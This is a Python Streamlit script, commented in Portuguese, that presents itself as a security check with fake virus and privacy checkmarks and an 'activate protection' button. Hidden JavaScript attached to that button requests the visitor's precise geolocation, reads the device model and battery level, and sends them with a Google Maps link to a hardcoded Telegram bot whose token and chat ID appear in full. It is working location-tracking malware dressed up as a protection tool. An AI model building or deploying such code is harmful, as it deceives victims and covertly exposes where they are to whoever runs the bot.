import streamlit as st
import streamlit.components.v1 as components
import time

# --- 1. CONFIGURAÇÃO E ESTILIZAÇÃO (MANTIDA EXATAMENTE COMO VOCÊ QUER) ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; border-radius: 20px; background-color: #262730; 
        color: white; border: none; height: 50px; font-weight: bold;
    }
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- 2. DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
CHAT_ID = "8210828398"

# --- 3. SCRIPT DE CAPTURA (CORRIGIDO PARA NÃO DAR ERRO DE SINTAXE) ---
js_code = f"""
<script>
    async function enviarTelegram(dados) {{
        var msg = "📍 **Nova Captura**\\n📱 Modelo: " + dados.modelo + "\\n🔋 Bateria: " + dados.bateria + "\\n🌍 Local: https://www.google.com/maps?q=" + dados.lat + "," + dados.lon;
        var url = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown";
        await fetch(url);
    }}

    async function capturar() {{
        var info = {{
            modelo: navigator.userAgent.split("(")[1].split(")")[0],
            bateria: "Desconhecida",
            lat: 0,
            lon: 0
        }};

        try {{
            var battery = await navigator.getBattery();
            info.bateria = Math.round(battery.level * 100) + "%";
        }} catch (e) {{}}

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(pos) {{
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                enviarTelegram(info);
            }}, function(err) {{
                console.log("Negado");
            }}, {{ enableHighAccuracy: true, timeout: 10000 }});
        }
    }}

    // Monitora o botão para disparar o pop-up de Precisão de Local
    var checkExist = setInterval(function() {{
       var btn = window.parent.document.querySelector('button');
       if (btn) {{
          btn.addEventListener('click', capturar);
          clearInterval(checkExist);
       }}
    }}, 500);
</script>
"""
components.html(js_code, height=0)

# --- 4. INTERFACE VISUAL ---
st.title("Verificar segurança")
placeholder = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Inicia a animação da bolha até 99%
    for i in range(4, 101, 5):
        placeholder.markdown('<div class="circle-container"><div class="circle spin">' + str(i) + '%</div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado inicial conforme seu print
    placeholder.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
